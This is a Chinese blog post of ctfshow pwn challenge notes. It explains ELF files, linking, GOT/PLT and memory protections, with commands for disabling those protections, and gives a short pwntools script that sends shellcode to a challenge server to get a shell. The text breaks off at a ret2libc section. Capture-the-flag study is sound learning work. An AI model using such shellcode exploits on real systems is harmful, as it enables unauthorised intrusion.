<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="gcc hello.c -save-temps &ndash;verbose\n-save-temps保存中间生成文件\n&ndash;verbose查看详细工具流\n预处理 gcc -E hello.c -o hello.i\n编译 gcc -S hello.c -o hello.s\n汇编 gcc -c hello.s -o hello.o\n重定向文件\n反汇编\n">
<title>ctfshow-pwn</title>

<link rel='canonical' href='https://Frederick2313072.github.io/p/ctfshow-pwn/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="ctfshow-pwn">
<meta property='og:description' content="gcc hello.c -save-temps &ndash;verbose\n-save-temps保存中间生成文件\n&ndash;verbose查看详细工具流\n预处理 gcc -E hello.c -o hello.i\n编译 gcc -S hello.c -o hello.s\n汇编 gcc -c hello.s -o hello.o\n重定向文件\n反汇编\n">
<meta property='og:url' content='https://Frederick2313072.github.io/p/ctfshow-pwn/'>
<meta property='og:site_name' content='Frederick'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-23T01:18:06&#43;08:00'/>
<meta name="twitter:title" content="ctfshow-pwn">
<meta name="twitter:description" content="gcc hello.c -save-temps &ndash;verbose\n-save-temps保存中间生成文件\n&ndash;verbose查看详细工具流\n预处理 gcc -E hello.c -o hello.i\n编译 gcc -S hello.c -o hello.s\n汇编 gcc -c hello.s -o hello.o\n重定向文件\n反汇编\n">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "dark");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_db8ca5b2d3391751.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">🐋</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Frederick</a></h1>
            <h2 class="site-description">Welcome to my alter ego&#39;s site!</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/Frederick2313072'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/resources/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Resources</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#elf文件">ELF文件</a>
      <ol>
        <li><a href="#结构">结构</a></li>
      </ol>
    </li>
    <li><a href="#可执行文件的装载">可执行文件的装载</a>
      <ol>
        <li><a href="#地址空间分配">地址空间分配</a></li>
        <li><a href="#静态链接的详细过程">静态链接的详细过程</a></li>
        <li><a href="#动态链接">动态链接</a></li>
      </ol>
    </li>
    <li><a href="#stack-canaries">Stack Canaries</a></li>
    <li><a href="#nx">NX</a></li>
    <li><a href="#aslr">ASLR</a></li>
    <li><a href="#pie">PIE</a></li>
    <li><a href="#full-relro">Full Relro</a></li>
    <li><a href="#gotplt和plt的作用">.GOT.PLT和.PLT的作用</a></li>
    <li><a href="#链接重定位">链接重定位</a></li>
    <li><a href="#pwn24">pwn24</a></li>
    <li><a href="#pwn25">pwn25</a></li>
    <li><a href="#pwn26">pwn26</a></li>
    <li><a href="#pwn29">pwn29</a></li>
    <li><a href="#pwn30">pwn30</a></li>
    <li><a href="#pwn32">pwn32</a>
      <ol>
        <li><a href="#对函数的解释">对函数的解释</a></li>
      </ol>
    </li>
    <li><a href="#pwn33">pwn33</a></li>
    <li><a href="#pwn34">pwn34</a></li>
    <li><a href="#pwn35">pwn35</a></li>
    <li><a href="#pwn36">pwn36</a></li>
    <li><a href="#pwn37">pwn37</a></li>
    <li><a href="#pwn38">pwn38</a></li>
    <li><a href="#pwn39">pwn39</a></li>
    <li><a href="#pwn94">pwn94</a></li>
    <li><a href="#pwn95">pwn95</a></li>
    <li><a href="#pwn96">pwn96</a></li>
    <li><a href="#pwn101">pwn101</a></li>
    <li><a href="#pwn102">pwn102</a></li>
    <li><a href="#pwn105">pwn105</a></li>
    <li><a href="#pwn107">pwn107</a></li>
    <li><a href="#pwn41">pwn41</a></li>
    <li><a href="#pwn42">pwn42</a></li>
    <li><a href="#pwn43">pwn43</a></li>
    <li><a href="#pwn44">pwn44</a></li>
    <li><a href="#pwn45">pwn45</a></li>
    <li><a href="#pwn47">pwn47</a></li>
    <li><a href="#pwn48">pwn48</a></li>
    <li><a href="#pwn49">pwn49</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ctfshow-pwn/">ctfshow-pwn</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-03-15</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>gcc hello.c -save-temps &ndash;verbose</p>
<p>-save-temps保存中间生成文件</p>
<p>&ndash;verbose查看详细工具流</p>
<ul>
<li>预处理</li>
</ul>
<p>gcc -E hello.c -o hello.i</p>
<ul>
<li>编译</li>
</ul>
<p>gcc -S hello.c -o hello.s</p>
<ul>
<li>汇编</li>
</ul>
<p>gcc -c hello.s -o hello.o</p>
<p>重定向文件</p>
<p>反汇编</p>
<p>objdump -sd hello.o -M intel</p>
<ul>
<li>链接</li>
</ul>
<p>gcc hello.o -o hello -static</p>
<p>默认动态，-static指定静态链接</p>
<p>objdump -sd hello -M intel</p>
<p>-M intel</p>
<ul>
<li>指定反汇编的输出格式为 Intel 语法（而不是默认的 AT&amp;T 语法）。</li>
<li>Intel 语法是汇编语言的一种常见格式，通常更易于阅读。</li>
</ul>
<p>-s 选项</p>
<ul>
<li>显示文件的完整内容（包括十六进制和 ASCII 表示）。</li>
</ul>
<ul>
<li>例如，它会显示每个段的十六进制数据以及对应的 ASCII 字符。</li>
</ul>
<p>-d 选项</p>
<ul>
<li>反汇编文件中的可执行代码段。</li>
<li>例如，它会将二进制代码转换为汇编指令。</li>
</ul>
<h2 id="elf文件">ELF文件
</h2><p>可执行文件.exec</p>
<p>可重定位文件，尚未链接 .rel</p>
<p>共享目标文件：动态链接库文件.dyc</p>
<h3 id="结构">结构
</h3><ul>
<li>文件头</li>
</ul>
<p><img src="/p/ctfshow-pwn/image-20250227214747649.png"
	width="1848"
	height="866"
	srcset="/p/ctfshow-pwn/image-20250227214747649_hu_bd3246baed0aea0.png 480w, /p/ctfshow-pwn/image-20250227214747649_hu_1753cc623b7357cf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="213"
		data-flex-basis="512px"
	
></p>
<ul>
<li>节头表</li>
</ul>
<p><img src="/p/ctfshow-pwn/image-20250227214822812.png"
	width="1761"
	height="1546"
	srcset="/p/ctfshow-pwn/image-20250227214822812_hu_b3694f475a400218.png 480w, /p/ctfshow-pwn/image-20250227214822812_hu_c6105248afb08909.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="113"
		data-flex-basis="273px"
	
></p>
<p>.text</p>
<p>.data</p>
<p>.bss</p>
<h2 id="可执行文件的装载">可执行文件的装载
</h2><p>运行一个可执行文件时，需要将该文件和动态链接库装载到进程空间中，形成一个进程镜像，每个进程都拥有独立的虚拟地址空间，这个空间日和布局是由记录在段头表的程序头决定的</p>
<p><img src="/p/ctfshow-pwn/image-20250227221024347.png"
	width="1787"
	height="1528"
	srcset="/p/ctfshow-pwn/image-20250227221024347_hu_f22177dcc3fe806.png 480w, /p/ctfshow-pwn/image-20250227221024347_hu_15f9ab4491825f4a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="116"
		data-flex-basis="280px"
	
></p>
<h3 id="地址空间分配">地址空间分配
</h3><p>相似节合并</p>
<h3 id="静态链接的详细过程">静态链接的详细过程
</h3><p>符号解析：每个符号（函数，变量）与定义关联</p>
<p>重定位：每个符号定义与内存地址关联</p>
<p>静态链接库：.a</p>
<h3 id="动态链接">动态链接
</h3><p>在运行或加载时，在内存中完成链接的过程，用于动态连接的系统库叫共享库</p>
<p>如funcq.elf和func2.elf不再包含单独的testlib.o，运行func1.elf时，系统将func1.elf和依赖的testlib.o装载如内存，然后进行动态链接，完成后系统将控制权交给程序入口点，当func2.elf想要执行时，由于内存中已经有testlib.o,因此不再重复加载</p>
<h2 id="stack-canaries">Stack Canaries
</h2><p>canary的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的地方，攻击者要想控制函数的返回指针，就一定要先覆盖到canary,如果被改变，则认为是发生了栈溢出</p>
<p>gcc默认使用stack canary保护，关闭方法加入“-fno-stack-protector”</p>
<h2 id="nx">NX
</h2><p>开启NX保护不能直接使用shellcode执行任意代码，gcc默认开启，关闭方法加-z execstack</p>
<h2 id="aslr">ASLR
</h2><p>将程序的堆栈地址和动态链接库的加载地址进行一定的随机化，这些地址之间是不可读写执行的未映射内存，降低攻击者对程序内存结构的了解程序</p>
<p><img src="/p/ctfshow-pwn/image-20250228141347980.png"
	width="1272"
	height="1113"
	srcset="/p/ctfshow-pwn/image-20250228141347980_hu_99dd4e2ad0380f47.png 480w, /p/ctfshow-pwn/image-20250228141347980_hu_494897763b3705d8.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="114"
		data-flex-basis="274px"
	
></p>
<p>关闭方式，修改/proc/sys/kernel/randomize_va_space文件的内容为0</p>
<h2 id="pie">PIE
</h2><p>让ELF地址随机化加载，使得程序的内存结构对攻击者未知，进一步提高程序的安全性</p>
<p>开启-fpic-pie</p>
<p>关闭-no-pie</p>
<h2 id="full-relro">Full Relro
</h2><p>开启“-z relro”</p>
<h2 id="gotplt和plt的作用">.GOT.PLT和.PLT的作用
</h2><p>一个程序想调用动态链接库中的函数，必须使用.GOT.PLT和.PLT配合完成调用</p>
<p>.PLT表是一段代码，从内存中取出一个地址然后跳转</p>
<p>.GOT.PLT表存放实际地址</p>
<p>由于Linux的Lazy binding机制，没有开启Full Rello的ELF种，某个函数必须被调用，.GOT.PLT表才会存放函数的真实地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span><span class="err">`</span><span class="p">:</span> <span class="err">这是</span> <span class="err">`</span><span class="n">main</span><span class="err">`</span> <span class="err">函数的定义，它接受三个参数，分别是程序的参数数量</span> <span class="err">`</span><span class="n">argc</span><span class="err">`、参数列表</span> <span class="err">`</span><span class="n">argv</span><span class="err">`</span> <span class="err">和环境变量</span> <span class="err">`</span><span class="n">envp</span>
</span></span><span class="line"><span class="cl"><span class="n">v6</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);:</span> <span class="err">这一行读取了</span> <span class="n">FS</span> <span class="err">寄存器偏移</span> <span class="mh">0x28</span> <span class="err">处的值并存储到</span> <span class="n">v6</span> <span class="err">中</span>
</span></span><span class="line"><span class="cl"><span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);</span> <span class="err">和</span> <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);:</span> <span class="err">这两行调用了</span> <span class="n">setvbuf</span> <span class="err">函数，用于设置缓冲区类型。第一个调用将</span> <span class="n">_bss_start</span> <span class="err">的缓冲区类型设置为无缓冲，第二个调用将标准输入的缓冲区类型设置为无缓冲。</span>
</span></span><span class="line"><span class="cl"><span class="n">strcpy</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s2">&#34;CTFshowPWN&#34;</span><span class="p">);:</span> <span class="err">这行将字符串</span> <span class="s2">&#34;CTFshowPWN&#34;</span> <span class="err">复制到</span> <span class="n">s1</span> <span class="err">数组中</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">)</span> <span class="p">)</span> <span class="n">execve_func</span><span class="p">();:</span> <span class="err">这行使用</span> <span class="n">strcmp</span> <span class="err">函数比较</span> <span class="n">s1</span> <span class="err">和</span> <span class="n">s2</span> <span class="err">是否相等，如果相等，则调用</span> <span class="n">execve_func</span> <span class="err">函数。</span>
</span></span><span class="line"><span class="cl"><span class="n">setvbuf</span><span class="p">:</span> <span class="err">这个函数用于设置文件流的缓冲区类型。它允许程序员控制标准</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="err">库中文件流的缓冲方式。通常，我们可以将文件流设置为无缓冲、行缓冲或全缓冲。在这个代码中，</span><span class="n">setvbuf</span> <span class="err">函数被用于设置</span> <span class="n">_bss_start</span> <span class="err">和标准输入流</span> <span class="n">stdin</span> <span class="err">的缓冲类型为无缓冲，这意味着每次输出都会立即被写入，而不会先缓存在内存中。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">strcpy</span><span class="p">:</span> <span class="err">这个函数用于将一个字符串复制到另一个字符串数组中。它接受两个参数，第一个参数是目标字符串数组，第二个参数是源字符串。</span><span class="n">strcpy</span> <span class="err">会将源字符串的内容逐个字符地复制到目标字符串数组中，直到遇到源字符串的结束符</span> \<span class="mi">0</span><span class="err">。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts</span><span class="p">:</span> <span class="n">puts</span> <span class="err">函数用于向标准输出打印字符串，并在最后自动添加一个换行符</span> \<span class="n">n</span><span class="err">。它接受一个字符串作为参数，并将其打印到标准输出流中。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">scanf</span><span class="p">:</span> <span class="err">这个函数用于从标准输入流中读取输入。它接受格式化字符串作为第一个参数，用于指定输入的格式，以及一系列指向变量的指针，用于存储读取到的值。在这个代码中，</span><span class="n">scanf</span> <span class="err">被用于从标准输入中读取一个字符串，并将其存储到</span> <span class="n">s2</span> <span class="err">字符数组中。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">strcmp</span><span class="p">:</span> <span class="err">这个函数用于比较两个字符串是否相等。它接受两个字符串作为参数，并返回一个整数值，如果两个字符串相等则返回</span><span class="mi">0</span><span class="err">，否则返回它们第一个不相等字符的</span> <span class="n">ASCII</span> <span class="err">差值。在这个代码中，</span><span class="n">strcmp</span> <span class="err">用于比较</span> <span class="n">s1</span> <span class="err">和</span> <span class="n">s2</span> <span class="err">是否相等，如果相等则返回</span><span class="mi">0</span><span class="err">，程序将执行</span> <span class="n">execve_func</span> <span class="err">函数。</span>
</span></span><span class="line"><span class="cl"><span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);:</span> <span class="err">这一行调用了</span> <span class="n">execve</span> <span class="err">函数，用于执行一个程序。它接受三个参数，分别是要执行的程序路径、参数列表和环境变量列表。在这里，它执行了</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">，并传递了一个空的参数列表和环境变量列表，表示没有额外的参数和环境变量。</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>IDA转换数据：C（转换为代码）、D（转换为数据）、<strong>A</strong>（转换为字符）、N（为标签重命名)</p>
<p>checksec查看文件信息</p>
<p>read()读取</p>
<p>strcat()赋值</p>
<p>system()调用</p>
<p>echo&raquo;在文件后面追加内容</p>
<p>echo&gt;覆盖文件</p>
<p>fork()创建了子进程，fclose(_bss_star)关闭了输出流，即使后面再输入，也不会有回显，在命令后加上&gt;&amp;0 ，将命令的输出重定向到标准输入，也就是将命令的输出内容发送到与终端或键盘关联的地方</p>
<p><img src="/p/ctfshow-pwn/image-20250301105308304.png"
	width="986"
	height="472"
	srcset="/p/ctfshow-pwn/image-20250301105308304_hu_24130e6f2b6edee8.png 480w, /p/ctfshow-pwn/image-20250301105308304_hu_1d58cb8119c4dd4a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="501px"
	
></p>
<h2 id="链接重定位">链接重定位
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.text
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 调用printf的call指令
</span></span><span class="line"><span class="cl">call printf_stub
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">printf_stub:
</span></span><span class="line"><span class="cl">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址
</span></span><span class="line"><span class="cl">    jmp rax // 跳过去执行printf函数
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">.data
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">printf函数的储存地址：
</span></span><span class="line"><span class="cl">　　这里储存printf函数重定位后的地址
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn/image-20250301111550897.png"
	width="1925"
	height="942"
	srcset="/p/ctfshow-pwn/image-20250301111550897_hu_889f0352dea244c1.png 480w, /p/ctfshow-pwn/image-20250301111550897_hu_2777513017fd53fe.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="204"
		data-flex-basis="490px"
	
></p>
<p>.got和.got.plt是否可写与RELRO有关，这是linux系统下可执行文件的一种保护机制，它用于增强程序的安全性，特别是针对共享库的攻击。RELRO机制通过将部分ELF段标记为只读，防止攻击者利用全局偏移表（GOT）和过程链接表（PLT）进行攻击。规定如下：</p>
<p>当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。
当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。
当RELRO为No RELRO时，表示.got与.got.plt都可写。</p>
<p>可以通过checksec命令来获取可执行文件的部分保护机制信息。</p>
<p>可以通过readelf -S命令查看文件的各个段的详细信息，其中就包括了.got和.got.plt表的地址
用objdump -h pwn命令查看elf头信息，VMA即地址（虚拟地址和物理地址相同)</p>
<p><img src="/p/ctfshow-pwn/image-20250301114121781.png"
	width="1577"
	height="165"
	srcset="/p/ctfshow-pwn/image-20250301114121781_hu_84c5c4b6da376986.png 480w, /p/ctfshow-pwn/image-20250301114121781_hu_57dfcf1928e9cffc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="955"
		data-flex-basis="2293px"
	
></p>
<p><img src="/p/ctfshow-pwn/image-20250301120546826.png"
	width="849"
	height="234"
	srcset="/p/ctfshow-pwn/image-20250301120546826_hu_f8e3bffebad7a395.png 480w, /p/ctfshow-pwn/image-20250301120546826_hu_c1a9a1778567c1a7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="362"
		data-flex-basis="870px"
	
></p>
<p>只要传参src，长度大于0x3Eh+0x4就会发生溢出,使用./(file)传参</p>
<p><img src="/p/ctfshow-pwn/image-20250301121340085.png"
	width="2351"
	height="535"
	srcset="/p/ctfshow-pwn/image-20250301121340085_hu_1941c3b1326ec9f6.png 480w, /p/ctfshow-pwn/image-20250301121340085_hu_e3e6ead405c9cb03.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="439"
		data-flex-basis="1054px"
	
></p>
<h2 id="pwn24">pwn24
</h2><p><img src="/p/ctfshow-pwn/image-20250301121820857.png"
	width="2116"
	height="826"
	srcset="/p/ctfshow-pwn/image-20250301121820857_hu_3642defef2f453aa.png 480w, /p/ctfshow-pwn/image-20250301121820857_hu_b6554968a049d145.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="614px"
	
></p>
<p>调用read函数，读取输入，存入[ebp+buf]中，lea eax [ebp+buf]把地址存入eax中，然后，call eax执行</p>
<p><img src="/p/ctfshow-pwn/image-20250301122519477.png"
	width="1228"
	height="361"
	srcset="/p/ctfshow-pwn/image-20250301122519477_hu_18eac2c99a8f1809.png 480w, /p/ctfshow-pwn/image-20250301122519477_hu_7bfd7934d6c921b4.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="340"
		data-flex-basis="816px"
	
></p>
<p>NX是disables，说明可以用shellcode进行攻击</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
</span></span><span class="line"><span class="cl">p=remote(&#34;pwn.challenge.ctf.show&#34;,28284)#与服务器的pwn文件建立联系
</span></span><span class="line"><span class="cl">shell=asm(shellcraft.sh())#利用shellcraft模块生成调用系统shell（/bin/sh）的shellcode。这个shellcode可以用于执行命令行命令
</span></span><span class="line"><span class="cl">p.sendline(shell)#向远程发送shellcode
</span></span><span class="line"><span class="cl">p.interactive()#建立交互式对话
</span></span></code></pre></td></tr></table>
</div>
</div><p>就获得控制台权限了</p>
<h2 id="pwn25">pwn25
</h2><p>ret2libc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
